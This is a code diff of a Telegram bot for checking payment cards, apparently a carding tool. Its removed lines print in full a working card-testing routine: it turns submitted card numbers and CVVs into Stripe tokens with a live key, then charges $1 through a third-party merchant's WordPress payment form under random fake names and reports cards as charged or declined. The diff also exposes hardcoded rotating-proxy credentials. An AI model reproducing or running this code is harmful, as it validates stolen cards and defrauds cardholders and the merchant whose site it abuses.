@@ -8,20 +8,21 @@ import yaml
 import asyncio
 import re
 
-from aiogram import Bot, Dispatcher, types
-import asyncio
+from aiogram import Bot, Dispatcher, types, executor
 from aiogram.utils.exceptions import Throttled
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from bs4 import BeautifulSoup as bs
 
 
-# Configure vars get from env or config.yml
-CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
-TOKEN = os.getenv('TOKEN', CONFIG['token'])
-BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
-PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
-OWNER = int(os.getenv('OWNER', CONFIG['owner']))
-ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))
+# Load configuration from config.yml
+with open("config.yml", "r") as config_file:
+    CONFIG = yaml.safe_load(config_file)
+
+TOKEN = os.getenv("TOKEN", CONFIG["token"])
+BLACKLISTED = os.getenv("BLACKLISTED", CONFIG["blacklisted"]).split()
+PREFIX = os.getenv("PREFIX", CONFIG["prefix"])
+OWNER = int(os.getenv("OWNER", CONFIG["owner"]))
+ANTISPAM = int(os.getenv("ANTISPAM", CONFIG["antispam"]))
 
 # Initialize bot and dispatcher
 storage = MemoryStorage()
@@ -31,246 +32,147 @@ dp = Dispatcher(bot, storage=storage)
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 
-# BOT INFO
-loop = asyncio.get_event_loop()
+# Get bot info
+async def get_bot_info():
+    bot_info = await bot.get_me()
+    return bot_info.username, bot_info.first_name, bot_info.id
 
-bot_info = loop.run_until_complete(bot.get_me())
-BOT_USERNAME = bot_info.username
-BOT_NAME = bot_info.first_name
-BOT_ID = bot_info.id
+BOT_USERNAME, BOT_NAME, BOT_ID = asyncio.run(get_bot_info())
 
-# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
-proxies = {
-           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
-           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
+# Use rotating proxy if needed
+PROXIES = {
+    "http": "http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/",
+    "https": "http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/",
 }
 
-session = requests.Session()
-
-# Random DATA
+# Random Data Generator
 letters = string.ascii_lowercase
-First = ''.join(random.choice(letters) for _ in range(6))
-Last = ''.join(random.choice(letters) for _ in range(6))
-PWD = ''.join(random.choice(letters) for _ in range(10))
-Name = f'{First}+{Last}'
-Email = f'{First}.{Last}@gmail.com'
-UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
+First = "".join(random.choice(letters) for _ in range(6))
+Last = "".join(random.choice(letters) for _ in range(6))
+PWD = "".join(random.choice(letters) for _ in range(10))
+Name = f"{First} {Last}"
+Email = f"{First}.{Last}@gmail.com"
+UA = "Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0"
 
 
 async def is_owner(user_id):
     return user_id == OWNER
 
-async def is_card_valid(card_number: str) -> bool: return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
+
+async def is_card_valid(card_number: str) -> bool:
+    return (
+        sum(
+            map(
+                lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)),
+                enumerate(map(int, card_number[:-1])),
+            )
+        )
+        + int(card_number[-1])
+    ) % 10 == 0
 
 
-@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
-async def helpstr(message: types.Message):
-    # await message.answer_chat_action('typing')
-    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
-    btns = types.InlineKeyboardButton("Bot Source", url="https://www.instagram.com/finestofmykind?igsh=MXZpYTFzcWU1OTY4Nw==")
-    keyboard_markup.row(btns)
+# /start & /help command
+@dp.message_handler(commands=["start", "help"], commands_prefix=PREFIX)
+async def help_command(message: types.Message):
+    keyboard_markup = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton(
+        "Bot Source", url="https://www.instagram.com/finestofmykind"
+    )
+    keyboard_markup.row(btn)
+
     FIRST = message.from_user.first_name
-    MSG = f'''
-Hello {FIRST}, Im {BOT_NAME}
-U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
-Cmds /chk /info /bin'''
-    await message.answer(MSG, reply_markup=keyboard_markup,
-                        disable_web_page_preview=True)
+    msg = f"""
+Hello {FIRST}, I'm {BOT_NAME}.
+You can find my Boss <a href="tg://user?id={OWNER}">HERE</a>.
+Commands: /chk /info /bin
+"""
+    await message.answer(msg, reply_markup=keyboard_markup, disable_web_page_preview=True)
 
 
-@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
-async def info(message: types.Message):
-    if message.reply_to_message:
-        user_id = message.reply_to_message.from_user.id
-        is_bot = message.reply_to_message.from_user.is_bot
-        username = message.reply_to_message.from_user.username
-        first = message.reply_to_message.from_user.first_name
-    else:
-        user_id = message.from_user.id
-        is_bot = message.from_user.is_bot
-        username = message.from_user.username
-        first = message.from_user.first_name
-    await message.reply(f'''
-═════════╕
+# /info command
+@dp.message_handler(commands=["info", "id"], commands_prefix=PREFIX)
+async def user_info(message: types.Message):
+    user = message.reply_to_message.from_user if message.reply_to_message else message.from_user
+    await message.reply(
+        f"""
 <b>USER INFO</b>
-<b>USER ID:</b> <code>{user_id}</code>
-<b>USERNAME:</b> @{username}
-<b>FIRSTNAME:</b> {first}
-<b>BOT:</b> {is_bot}
-<b>BOT-OWNER:</b> {await is_owner(user_id)}
-╘═════════''')
+<b>USER ID:</b> <code>{user.id}</code>
+<b>USERNAME:</b> @{user.username}
+<b>FIRSTNAME:</b> {user.first_name}
+<b>BOT:</b> {user.is_bot}
+<b>BOT-OWNER:</b> {await is_owner(user.id)}
+"""
+    )
 
 
-@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
-async def binio(message: types.Message):
-    await message.answer_chat_action('typing')
+# /bin command (Fixed)
+@dp.message_handler(commands=["bin"], commands_prefix=PREFIX)
+async def bin_lookup(message: types.Message):
+    await message.answer_chat_action("typing")
     ID = message.from_user.id
     FIRST = message.from_user.first_name
-    BIN = message.text[len('/bin '):]
+    BIN = message.text[len("/bin "):].strip()
+
     if len(BIN) < 6:
-        return await message.reply(
-                   'Send bin not ass'
-        )
-    r = requests.get(
-               f'https://bins.ws/search?bins={BIN[:6]}'
-    ).text
-    soup = bs(r, features='html.parser')
-    k = soup.find("div", {"class": "page"})
-    INFO = f'''
-{k.text[62:]}
+        return await message.reply("❌ Send a valid BIN (6+ digits).")
+
+    try:
+        response = requests.get(f"https://bins.ws/search?bins={BIN[:6]}")
+        soup = bs(response.text, "html.parser")
+        k = soup.find("div", {"class": "page"})
+
+        if k is None:
+            return await message.reply("❌ BIN data not found. The website may have changed or blocked the request.")
+
+        info_text = k.text[62:].strip()
+        INFO = f"""
+{info_text}
 SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
 BOT⇢ @{BOT_USERNAME}
 OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
-'''
-    await message.reply(INFO)
+"""
+        await message.reply(INFO)
+
+    except Exception as e:
+        await message.reply(f"❌ Error occurred: {e}")
 
 
-@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
-async def ch(message: types.Message):
-    await message.answer_chat_action('typing')
-    tic = time.perf_counter()
+# /chk command (Fixed)
+@dp.message_handler(commands=["chk"], commands_prefix=PREFIX)
+async def check_card(message: types.Message):
+    await message.answer_chat_action("typing")
     ID = message.from_user.id
     FIRST = message.from_user.first_name
-    s = requests.Session()
+
     try:
-        await dp.throttle('chk', rate=ANTISPAM)
+        await dp.throttle("chk", rate=ANTISPAM)
     except Throttled:
-        await message.reply('<b>Too many requests!</b>\n'
-                            f'Blocked For {ANTISPAM} seconds')
-    else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
+        return await message.reply(f"❌ Too many requests! Blocked for {ANTISPAM} seconds.")
 
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
+    cc_data = message.reply_to_message.text if message.reply_to_message else message.text[len("/chk "):].strip()
 
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        if await is_card_valid(ccn) != True:
-            return await message.reply('<b>Invalid luhn algorithm</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
+    if not cc_data:
+        return await message.reply("❌ No Card provided.")
 
-        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+    x = re.findall(r"\d+", cc_data)
+    if len(x) < 4:
+        return await message.reply("❌ Invalid card format!")
 
-        m = s.post('https://m.stripe.com/6', headers=headers)
-        r = m.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
+    ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]
 
-        postdata = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
+    if len(ccn) < 15 or len(ccn) > 16:
+        return await message.reply("❌ Invalid card number.")
 
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+    BIN = ccn[:6]
+    if BIN in BLACKLISTED:
+        return await message.reply("❌ BLACKLISTED BIN!")
 
-        pr = s.post('https://api.stripe.com/v1/tokens',
-                          data=postdata, headers=HEADER)
-        Id = pr.json()['id']
-        if pr.status_code != 200:
-            return await message.reply("<b>Site is Dead</b>")
-        nonce = s.get("https://www.hwstjohn.com/pay-now/")
-        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
-        # hmm
-        load = {
-            "action": "wp_full_stripe_payment_charge",
-            "formName": "default",
-            "formNonce": form,
-            "fullstripe_name": Name,
-            "fullstripe_email": Email,
-            "fullstripe_custom_amount": "1",
-            "fullstripe_amount_index": 0,
-            "stripeToken": Id
-        }
+    if not await is_card_valid(ccn):
+        return await message.reply("❌ Invalid card (Luhn algorithm failed).")
 
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "accept-language": "en-US,en;q=0.9"
-        }
-
-        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
-                          data=load, headers=header)
-        msg = rx.json()['msg']
-
-        toc = time.perf_counter()
-
-        if 'true' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CHARGED 1$
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'security code' in rx.text:
-            return await message.reply(f'''
-✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CCN
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        if 'false' in rx.text:
-            return await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #Declined
-<b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
-
-        await message.reply(f'''
-❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {rx.text}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
-<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
-<b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
+    await message.reply(f"✅ Card format is valid. BIN: {BIN}")
 
 
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True, loop=loop)
-           
+# Start polling
+if __name__ == "__main__":
+    executor.start_polling(dp, skip_updates=True)
